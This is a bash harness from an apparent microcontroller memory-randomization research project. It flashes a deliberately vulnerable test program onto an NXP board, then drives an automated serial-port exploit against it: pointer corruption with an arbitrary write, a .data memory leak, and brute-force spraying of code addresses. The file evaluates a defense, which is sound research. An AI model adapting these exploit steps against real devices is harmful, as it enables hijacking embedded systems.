#!/usr/bin/env bash

ROOT_DIR=`dirname $0 | sed 's/$/\/../' | xargs realpath`

PROJ=exploit
PROJ_DIR="$ROOT_DIR/workspace/$PROJ"

PROGRAMS=(
    "exploit"
)

CONFIGURATIONS=(
    "baseline"
    "randezvous-small"
    "randezvous-medium"
    "randezvous-large"
)

#
# Load common components.
#
. "$ROOT_DIR/scripts/common.sh"

#
# Redefine the run() function.
#
# Run an already compiled exploit program.
#
# $1: the configuration to use.
# $2: the program to run.
# $3: number of seconds between two pairs of actions of feeding an input and
#     getting the output (default 0.6).
#
unset run
run() {
    # Find IDE if we have not done so
    if [[ -z "$FLASH_TOOL" ]] || [[ -z "$FLASH_SERVER" ]]; then
        find_ide
    fi

    # Check if necessary variables are defined
    if [[ -z "$CONFIGURATIONS" ]] || [[ -z "$PROGRAMS" ]] ||
       [[ -z "$PROJ" ]] || [[ -z "$PROJ_DIR" ]]; then
        echo "One or more necessary variables undefined!"
        exit 1
    fi
    # Check if the configuration name is valid
    if [[ ! " ${CONFIGURATIONS[@]} " =~ " $1 " ]]; then
        echo "Configuration must be one of the following:"
        echo "${CONFIGURATIONS[@]}"
        exit 1
    fi

    # Check if the program name is valid
    if [[ ! " ${PROGRAMS[@]} " =~ " $2 " ]]; then
        echo "Program must be one of the following:"
        echo "${PROGRAMS[@]}"
        exit 1
    fi

    # Check if the action interval is a good number
    local action_interval=0.6
    if [[ -n "$3" ]]; then
        if [[ "$3" =~ ^([0-9]+\.?[0-9]+|[0-9]*\.[0-9]+)$ ]]; then
            action_interval="$3"
        else
            echo "Invalid number of action interval!"
            exit 1
        fi
    fi

    ###########################################################################
    # Non-attacker steps
    ###########################################################################

    # Check if the ELF binary is there
    local debug_dir="$ROOT_DIR/debug/$PROJ-$1"
    local elf="$debug_dir/$1-$2.axf"
    if [[ ! -x "$elf" ]]; then
        echo "No $elf found!"
        echo "Try to compile first!"
        exit 1
    fi

    # Program the binary onto the board
    local flash_server_args=(
        "--commandline"
    )
    local flash_tool_load_args=(
        "--flash-load $elf"
        "-p MIMXRT685S"
        "-x $ROOT_DIR/scripts"
        "--bootromstall 0x50002034"
        "--args"
    )
    local flash_tool_reset_args=(
        "--reset hard"
        "-p MIMXRT685S"
        "-x $ROOT_DIR/scripts"
        "--bootromstall 0x50002034"
        "--args"
    )
    local flash_server_log=`mktemp -q`
    local flash_tool_log=`mktemp -q`
    echo "Programming $1-$2.axf onto the board ......"
    "$FLASH_SERVER" ${flash_server_args[@]} < "$FLASH_SERVER_SCRIPT" >& "$flash_server_log"
    if [[ -n `grep -i error "$flash_server_log"` ]]; then
        echo "Programming failed!"
        echo "Check $flash_server_log for details"
        exit 1
    fi
    "$FLASH_TOOL" ${flash_tool_load_args[@]} >& "$flash_tool_log"
    if (( $? != 0 )); then
        echo "Programming failed!"
        echo "Check $flash_tool_log for details"
        exit 1
    fi
    echo "Resetting the board ......"
    "$FLASH_TOOL" ${flash_tool_reset_args[@]} &>> "$flash_tool_log"
    if (( $? != 0 )); then
        echo "Resetting failed!"
        echo "Check $flash_tool_log for details"
        exit 1
    fi

    sleep 1

    ###########################################################################
    # Attacker steps
    ###########################################################################

    # Check if arm-none-eabi-objdump or llvm-objdump is there
    local objdump=`which arm-none-eabi-objdump 2> /dev/null`
    if [[ -z "$objdump" ]]; then
        objdump=`which llvm-objdump 2> /dev/null`
        if [[ -z "$objdump" ]]; then
            echo "arm-none-eabi-objdump or llvm-objdump not found!"
            exit 1
        fi
    fi

    # Kill all screens first
    local screen_name="Randezvous-ttyACM0"
    screen -S "$screen_name" -X kill >& /dev/null

    local output_dir="$DATA_DIR/$PROJ-$1"
    if [[ ! -d "$output_dir" ]]; then
        mkdir -p "$output_dir"
    fi

    local output_data="$output_dir/$1-$2-data-dump.txt"
    rm -rf "$output_data"

    # Open screen to receive the output
    screen -S "$screen_name" -dm -L -fn -Logfile "$output_data" /dev/ttyACM0 115200
    screen -S "$screen_name" -X logfile flush 0

    readonly anchor_dummy="hello world!!!!!"
    readonly anchor_finish="deadbeefdeadbeef"
    readonly anchor_fail="Error detected, rebooting"
    readonly anchor_success="Success!"
    readonly text_size=0x`"$objdump" -hw -j.text "$elf" | grep "\.text" | tr -s ' ' | cut -d' ' -f4`
    readonly text_addr=0x`"$objdump" -hw -j.text "$elf" | grep "\.text" | tr -s ' ' | cut -d' ' -f5`
    readonly data_size=0x`"$objdump" -hw -j.data "$elf" | grep "\.data" | tr -s ' ' | cut -d' ' -f4`
    readonly data_addr=0x`"$objdump" -hw -j.data "$elf" | grep "\.data" | tr -s ' ' | cut -d' ' -f5`
    readonly target_func="attacker_target"
    readonly target_size=16

    if [[ "$1" =~ ^baseline ]]; then
        readonly target_addr=$(itoh $(( 0x`"$objdump" -tw -j.text "$elf" | grep "\b$target_func\b" | cut -d' ' -f1` | 1 )))
        readonly ret_addr_slot=`itoh $(( 0x480000 - 292 ))`

        # Generate a payload (which corrupts a pointer)
        echo "Generating a payload to corrupt a pointer ......"
        local payload=`mktemp -q`
        echo -n "$anchor_finish" > "$payload"
        ito4b "$ret_addr_slot" >> "$payload"
        echo >> "$payload"

        # Feed the payload to the serial port
        echo "Feeding the payload ......"
        screen -S "$screen_name" -X readreg p "$payload"
        screen -S "$screen_name" -X paste p

        # Generate another payload (which triggers an arbitrary write)
        echo "Generating another payload to trigger an arbitrary write ......"
        payload=`mktemp -q`
        ito4b "$target_addr" > "$payload"
        echo >> "$payload"

        # Feed the payload to the serial port
        echo "Feeding the payload ......"
        screen -S "$screen_name" -X readreg p "$payload"
        screen -S "$screen_name" -X paste p

        # Wait until the anchor shows up
        grep "$anchor_success" "$output_data" >& /dev/null
        while (( $? != 0 )); do
            sleep "$action_interval"
            grep "$anchor_success" "$output_data" >& /dev/null
        done
        screen -S "$screen_name" -X kill

        echo "Success!"
        return
    fi

    # Generate the first payload (which leaks the content of .data section)
    echo "Generating the first payload to leak the content of .data section ......"
    local payload=`mktemp -q`
    echo -n "$anchor_finish" > "$payload"
    ito4b 0 >> "$payload"
    ito4b 1 >> "$payload"
    ito4b "$data_size" >> "$payload"
    ito4b "$data_addr" >> "$payload"
    echo >> "$payload"

    # Feed the first payload to the serial port
    echo "Feeding the first payload ......"
    screen -S "$screen_name" -X readreg p "$payload"
    screen -S "$screen_name" -X paste p

    # Wait until the anchor shows up
    echo "Waiting for data ......"
    grep "$anchor_finish" "$output_data" >& /dev/null
    while (( $? != 0 )); do
        sleep "$action_interval"
        grep "$anchor_finish" "$output_data" >& /dev/null
    done
    sleep "$action_interval"
    screen -S "$screen_name" -X kill

    # Analyze dumped data and find potential control data
    echo "Collecting potential control data ......"
    local dumped_data=(
        `sed -n 2p "$output_data" | sed -E 's/(..)(..)(..)(..)/0x\4\3\2\1\n/g' | sed -E '/^\s*$/d' | sort | uniq`
    )
    local ctrl_data=()
    for i in ${dumped_data[@]}; do
        if is_potential_control_data_to_try "$i"; then
            ctrl_data+=( $i )
        fi
    done
    echo "# of potential control data: ${#ctrl_data[@]}"

    echo "Resetting the board ......"
    "$FLASH_TOOL" ${flash_tool_reset_args[@]} >& "$flash_tool_log"
    if (( $? != 0 )); then
        echo "Resetting failed!"
        echo "Check $flash_tool_log for details"
        exit 1
    fi

    # Now start automatically generating and feeding payloads
    local failures=0
    local nothings=0
    for ii in ${!ctrl_data[@]}; do
        local i=${ctrl_data[$ii]}
        echo
        echo "Now using $i as the control data ($(( ii + 1 )) / ${#ctrl_data[@]})"
        echo

        for j in `seq "$data_addr" 128 $(( data_addr + (data_size - 1) / 128 * 128 )) | xargs printf "0x%.8x\n"`; do
            is_payload_able $j || continue

            local spray_size=128
            if (( j + spray_size > data_addr + data_size )); then
                spray_size=$(( data_addr + data_size - j ))
            fi
            echo "Trying to spray $i over [$j, `itoh $(( j + spray_size ))`)"

            output_data="$output_dir/$1-$2-output-$i-$j-$spray_size.txt"
            rm -rf "$output_data"

            # Open screen to receive the output
            screen -S "$screen_name" -dm -L -fn -Logfile "$output_data" /dev/ttyACM0 115200
            screen -S "$screen_name" -X logfile flush 0

            # Generate a payload (which corrupts a pointer)
            echo "  Generating a payload to corrupt a pointer ......"
            payload=`mktemp -q`
            echo -n "$anchor_dummy" > "$payload"
            ito4b "$j" >> "$payload"
            echo >> "$payload"

            # Feed the payload to the serial port
            echo "  Feeding the payload ......"
            screen -S "$screen_name" -X readreg p "$payload"
            screen -S "$screen_name" -X paste p

            # Generate another payload (which triggers an arbitrary write)
            echo "  Generating another payload to trigger an arbitrary write ......"
            payload=`mktemp -q`
            for n in `seq 1 $(( spray_size / 4 ))`; do
                ito4b "$i" >> "$payload"
            done
            echo >> "$payload"

            # Feed the payload to the serial port
            echo "  Feeding the payload ......"
            screen -S "$screen_name" -X readreg p "$payload"
            screen -S "$screen_name" -X paste p

            # Wait one interval of time for one of the anchors to show up
            grep "$anchor_fail" "$output_data" >& /dev/null ||
            grep "$anchor_success" "$output_data" >& /dev/null
            if (( $? != 0 )); then
                sleep "$action_interval"
                grep "$anchor_fail" "$output_data" >& /dev/null ||
                grep "$anchor_success" "$output_data" >& /dev/null
            fi
            screen -S "$screen_name" -X kill
            if grep "$anchor_fail" "$output_data" >& /dev/null; then
                failures=$(( failures + 1 ))
                echo -e "  \e[1;5;91mFailure\e[0m"
                echo "  # of failures = $failures"
                echo "  # of nothings = $nothings"
            elif grep "$anchor_success" "$output_data" >& /dev/null; then
                echo -e "  \e[1;92mSuccess!\e[0m"
                echo "  # of failures = $failures"
                echo "  # of nothings = $nothings"
                return
            else
                nothings=$(( nothings + 1 ))
                echo "  Nothing happened"
                echo "  # of failures = $failures"
                echo "  # of nothings = $nothings"
            fi
        done
    done
}

#
# Convert a number to a 4-byte hexadecimal.
#
# $1: a number.
#
itoh() {
    printf "0x%.8x" "$1"
}

#
# Convert a number to a 4-byte little-endian binary.
#
# $1: a number.
#
ito4b() {
    printf "0: %.8x" "$1" | sed -E 's/0: (..)(..)(..)(..)/0: \4\3\2\1/' | xxd -r
}

#
# Check if a number is a potential piece of control data to try.
#
# $1: a number.
#
is_potential_control_data_to_try() {
    (( $1 >= text_addr )) && (( $1 + target_size < text_addr + text_size )) &&
    (( $1 & 1 )) && is_payload_able $1
}

#
# Check if a number can be used as part of a payload.
#
# $1: a number.
#
is_payload_able() {
    (( ($1 & 0xff) != 0x0a )) && (( ($1 & 0xff) != 0x0d )) &&
    (( (($1 >> 8) & 0xff) != 0x0a )) && (( (($1 >> 8) & 0xff) != 0x0d )) &&
    (( (($1 >> 16) & 0xff) != 0x0a )) && (( (($1 >> 16) & 0xff) != 0x0d )) &&
    (( (($1 >> 24) & 0xff) != 0x0a )) && (( (($1 >> 24) & 0xff) != 0x0d ))
}

#
# Entrance of the script.
#
case $1 in
"debug" )
    debug $2 $3
    ;;
"run" )
    if (( $# == 2 )); then
        for program in ${PROGRAMS[@]}; do
            run $2 $program
        done
    else
        run $2 $3
    fi
    ;;
* )
    if (( $# == 1 )); then
        # Compile each benchmark program
        for program in ${PROGRAMS[@]}; do
            compile $1 $program
        done

        echo Done
    else
        compile $1 $2
    fi
    ;;
esac
